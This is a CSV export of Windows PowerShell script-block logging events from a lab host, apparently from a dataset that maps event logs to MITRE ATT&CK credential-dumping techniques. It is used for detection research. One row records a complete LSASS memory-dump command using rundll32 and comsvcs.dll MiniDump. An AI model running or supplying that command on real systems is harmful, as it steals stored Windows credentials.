RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
29,1304,2021-10-20 14:39:26.2558412,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Set-Location K:,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Set-Location K:""},{""@Name"":""ScriptBlockId"",""#text"":""eb9be239-a0b7-47d8-9d09-f1fd8e8e308e""}]}}"
30,1305,2021-10-20 14:39:26.2558412,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Set-Location L:,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Set-Location L:""},{""@Name"":""ScriptBlockId"",""#text"":""38fc7c20-6e22-4297-9603-711614fea4fb""}]}}"
31,1306,2021-10-20 14:39:26.2558412,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Set-Location M:,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Set-Location M:""},{""@Name"":""ScriptBlockId"",""#text"":""96bf0226-b104-4c70-996c-e0cddc8a906d""}]}}"
32,1307,2021-10-20 14:39:26.2558412,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Set-Location N:,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Set-Location N:""},{""@Name"":""ScriptBlockId"",""#text"":""f853a427-32a2-477d-86d2-e8d55a29de4b""}]}}"
33,1308,2021-10-20 14:39:26.2558412,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Set-Location O:,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Set-Location O:""},{""@Name"":""ScriptBlockId"",""#text"":""34f07b98-3fa7-4c94-b23b-de4d409173dd""}]}}"
34,1309,2021-10-20 14:39:26.2558412,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Set-Location P:,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Set-Location P:""},{""@Name"":""ScriptBlockId"",""#text"":""7643c353-2dd8-4588-bd19-068372f4449e""}]}}"
35,1310,2021-10-20 14:39:26.2558412,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Set-Location Q:,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Set-Location Q:""},{""@Name"":""ScriptBlockId"",""#text"":""bafee791-5f61-478c-b27e-fc6051f02424""}]}}"
36,1311,2021-10-20 14:39:26.2558412,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Set-Location R:,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Set-Location R:""},{""@Name"":""ScriptBlockId"",""#text"":""6ae074a7-11e8-4034-94cb-0bca270db926""}]}}"
37,1312,2021-10-20 14:39:26.2558412,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Set-Location S:,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Set-Location S:""},{""@Name"":""ScriptBlockId"",""#text"":""bf31dd02-765f-415c-a7be-2928165332ab""}]}}"
38,1313,2021-10-20 14:39:26.2558412,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Set-Location T:,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Set-Location T:""},{""@Name"":""ScriptBlockId"",""#text"":""d5101983-d5b5-4a4b-a4c2-1e28c394c17b""}]}}"
39,1314,2021-10-20 14:39:26.2558412,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Set-Location U:,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Set-Location U:""},{""@Name"":""ScriptBlockId"",""#text"":""b3436631-814a-4e9a-a9f5-f653e66afbb3""}]}}"
40,1315,2021-10-20 14:39:26.2558412,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Set-Location V:,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Set-Location V:""},{""@Name"":""ScriptBlockId"",""#text"":""682fcbda-a369-44b6-964b-f807b55f4783""}]}}"
41,1316,2021-10-20 14:39:26.2558412,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Set-Location W:,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Set-Location W:""},{""@Name"":""ScriptBlockId"",""#text"":""506c4b22-1250-4c1e-ba20-04bfe17784e8""}]}}"
42,1317,2021-10-20 14:39:26.2558412,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Set-Location X:,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Set-Location X:""},{""@Name"":""ScriptBlockId"",""#text"":""66d0e449-6174-4689-8701-954793f4319c""}]}}"
43,1318,2021-10-20 14:39:26.2558412,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Set-Location Y:,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Set-Location Y:""},{""@Name"":""ScriptBlockId"",""#text"":""a1df8479-12de-4867-91d2-8adbd07329e8""}]}}"
44,1319,2021-10-20 14:39:26.2558412,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Set-Location Z:,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Set-Location Z:""},{""@Name"":""ScriptBlockId"",""#text"":""2bea488b-2464-494c-999e-3e03854df0e7""}]}}"
45,1320,2021-10-20 14:39:26.2558412,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Set-Location ..,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Set-Location ..""},{""@Name"":""ScriptBlockId"",""#text"":""075b4a15-6529-4d7a-a310-86e866066eff""}]}}"
46,1321,2021-10-20 14:39:26.2558412,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Set-Location \,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Set-Location \\""},{""@Name"":""ScriptBlockId"",""#text"":""f0d12f4c-3604-42e8-89c0-551e9edd388f""}]}}"
47,1322,2021-10-20 14:39:26.2558412,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ","ScriptBlockText: ",,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText""},{""@Name"":""ScriptBlockId"",""#text"":""0783d7d2-2c3f-405e-b294-070c778241d6""}]}}"
48,1323,2021-10-20 14:39:26.2558412,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: Read-Host 'Press Enter to continue...' | Out-Null,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""Read-Host 'Press Enter to continue...' | Out-Null""},{""@Name"":""ScriptBlockId"",""#text"":""8bda6354-51f2-4779-ac7b-603934bc393a""}]}}"
49,1324,2021-10-20 14:39:26.3027207,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: $this.ServiceName,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""$this.ServiceName""},{""@Name"":""ScriptBlockId"",""#text"":""5336aa33-1fb7-4d40-bfbf-f0eb6d0c659f""}]}}"
50,1325,2021-10-20 14:39:26.3027207,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: [System.Management.ManagementDateTimeConverter]::ToDateTime($args[0]),,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""[System.Management.ManagementDateTimeConverter]::ToDateTime($args[0])""},{""@Name"":""ScriptBlockId"",""#text"":""6183a262-7846-45f4-af7a-4622cd671790""}]}}"
51,1326,2021-10-20 14:39:26.3027207,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ",ScriptBlockText: [System.Management.ManagementDateTimeConverter]::ToDmtfDateTime($args[0]),,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""[System.Management.ManagementDateTimeConverter]::ToDmtfDateTime($args[0])""},{""@Name"":""ScriptBlockId"",""#text"":""701d6e25-2203-4c4a-83b0-f3f656166317""}]}}"
52,1327,2021-10-20 14:39:26.3339688,40962,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,3532,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,,,,,,,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":""""}"
53,1328,2021-10-20 14:39:26.3495919,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,1584,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ","ScriptBlockText: C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id",,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id""},{""@Name"":""ScriptBlockId"",""#text"":""4b8cd779-8c92-48a7-b407-8a119e38c45a""}]}}"
54,1329,2021-10-20 14:39:26.3964706,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,3268,1584,FS03.offsec.lan,0,S-1-5-21-4230534742-2542757381-3142984815-1111,Contains contents of scripts run,,,"Path: ","ScriptBlockText: @{, GUID=""EEFCB906-B326-4E99-9F54-8B4BB6EF3C6D"", Author=""Microsoft Corporation"", CompanyName=""Microsoft Corporation"", Copyright=""© Microsoft Corporation. All rights reserved."", ModuleVersion=""3.1.0.0"", PowerShellVersion=""3.0"", CLRVersion=""4.0"", NestedModules=""Microsoft.PowerShell.Commands.Management.dll"", HelpInfoURI = 'http://go.microsoft.com/fwlink/?linkid=285756', CmdletsToExport=@(""Add-Content"",,     ""Clear-Content"",,     ""Clear-ItemProperty"",,     ""Join-Path"",,     ""Convert-Path"",,     ""Copy-ItemProperty"",,     ""Get-EventLog"",,     ""Clear-EventLog"",,     ""Write-EventLog"",,     ""Limit-EventLog"",,     ""Show-EventLog"",,     ""New-EventLog"",,     ""Remove-EventLog"",,     ""Get-ChildItem"",,     ""Get-Content"",,     ""Get-ItemProperty"",,     ""Get-WmiObject"",,     ""Invoke-WmiMethod"",,     ""Move-ItemProperty"",,     ""Get-Location"",,     ""Set-Location"",,     ""Push-Location"",,     ""Pop-Location"",,     ""New-PSDrive"",,     ""Remove-PSDrive"",,     ""Get-PSDrive"",,     ""Get-Item"",,     ""New-Item"",,     ""Set-Item"",,     ""Remove-Item"",,     ""Move-Item"",,     ""Rename-Item"",,     ""Copy-Item"",,     ""Clear-Item"",,     ""Invoke-Item"",,     ""Get-PSProvider"",,     ""New-ItemProperty"",,     ""Split-Path"",,     ""Test-Path"",,     ""Get-Process"",,     ""Stop-Process"",,     ""Wait-Process"",,     ""Debug-Process"",,     ""Start-Process"",,     ""Remove-ItemProperty"",,     ""Remove-WmiObject"",,     ""Rename-ItemProperty"",,     ""Register-WmiEvent"",,     ""Resolve-Path"",,     ""Get-Service"",,     ""Stop-Service"",,     ""Start-Service"",,     ""Suspend-Service"",,     ""Resume-Service"",,     ""Restart-Service"",,     ""Set-Service"",,     ""New-Service"",,     ""Set-Content"",,     ""Set-ItemProperty"",,     ""Set-WmiInstance"",,     ""Get-Transaction"",,     ""Start-Transaction"",,     ""Complete-Transaction"",,     ""Undo-Transaction"",,     ""Use-Transaction"",,     ""New-WebServiceProxy"",,     ""Get-HotFix"",,     ""Test-Connection"",,     ""Enable-ComputerRestore"",,     ""Disable-ComputerRestore"",,     ""Checkpoint-Computer"",,     ""Get-ComputerRestorePoint"",,     ""Restart-Computer"",,     ""Stop-Computer"",,     ""Restore-Computer"",,     ""Add-Computer"",,     ""Remove-Computer"",,     ""Test-ComputerSecureChannel"",,     ""Reset-ComputerMachinePassword"",,     ""Rename-Computer"",,     ""Get-ControlPanelItem"",,     ""Show-ControlPanelItem""), }, ",,,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID800-4103-4104-LSASS dump with LSASSY (PowerShell).evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""@{, GUID=\""EEFCB906-B326-4E99-9F54-8B4BB6EF3C6D\"", Author=\""Microsoft Corporation\"", CompanyName=\""Microsoft Corporation\"", Copyright=\""© Microsoft Corporation. All rights reserved.\"", ModuleVersion=\""3.1.0.0\"", PowerShellVersion=\""3.0\"", CLRVersion=\""4.0\"", NestedModules=\""Microsoft.PowerShell.Commands.Management.dll\"", HelpInfoURI = 'http://go.microsoft.com/fwlink/?linkid=285756', CmdletsToExport=@(\""Add-Content\"",,     \""Clear-Content\"",,     \""Clear-ItemProperty\"",,     \""Join-Path\"",,     \""Convert-Path\"",,     \""Copy-ItemProperty\"",,     \""Get-EventLog\"",,     \""Clear-EventLog\"",,     \""Write-EventLog\"",,     \""Limit-EventLog\"",,     \""Show-EventLog\"",,     \""New-EventLog\"",,     \""Remove-EventLog\"",,     \""Get-ChildItem\"",,     \""Get-Content\"",,     \""Get-ItemProperty\"",,     \""Get-WmiObject\"",,     \""Invoke-WmiMethod\"",,     \""Move-ItemProperty\"",,     \""Get-Location\"",,     \""Set-Location\"",,     \""Push-Location\"",,     \""Pop-Location\"",,     \""New-PSDrive\"",,     \""Remove-PSDrive\"",,     \""Get-PSDrive\"",,     \""Get-Item\"",,     \""New-Item\"",,     \""Set-Item\"",,     \""Remove-Item\"",,     \""Move-Item\"",,     \""Rename-Item\"",,     \""Copy-Item\"",,     \""Clear-Item\"",,     \""Invoke-Item\"",,     \""Get-PSProvider\"",,     \""New-ItemProperty\"",,     \""Split-Path\"",,     \""Test-Path\"",,     \""Get-Process\"",,     \""Stop-Process\"",,     \""Wait-Process\"",,     \""Debug-Process\"",,     \""Start-Process\"",,     \""Remove-ItemProperty\"",,     \""Remove-WmiObject\"",,     \""Rename-ItemProperty\"",,     \""Register-WmiEvent\"",,     \""Resolve-Path\"",,     \""Get-Service\"",,     \""Stop-Service\"",,     \""Start-Service\"",,     \""Suspend-Service\"",,     \""Resume-Service\"",,     \""Restart-Service\"",,     \""Set-Service\"",,     \""New-Service\"",,     \""Set-Content\"",,     \""Set-ItemProperty\"",,     \""Set-WmiInstance\"",,     \""Get-Transaction\"",,     \""Start-Transaction\"",,     \""Complete-Transaction\"",,     \""Undo-Transaction\"",,     \""Use-Transaction\"",,     \""New-WebServiceProxy\"",,     \""Get-HotFix\"",,     \""Test-Connection\"",,     \""Enable-ComputerRestore\"",,     \""Disable-ComputerRestore\"",,     \""Checkpoint-Computer\"",,     \""Get-ComputerRestorePoint\"",,     \""Restart-Computer\"",,     \""Stop-Computer\"",,     \""Restore-Computer\"",,     \""Add-Computer\"",,     \""Remove-Computer\"",,     \""Test-ComputerSecureChannel\"",,     \""Reset-ComputerMachinePassword\"",,     \""Rename-Computer\"",,     \""Get-ControlPanelItem\"",,     \""Show-ControlPanelItem\""), }, ""},{""@Name"":""ScriptBlockId"",""#text"":""62c273e1-22da-44fc-a6c3-5cb365453815""}]}}"
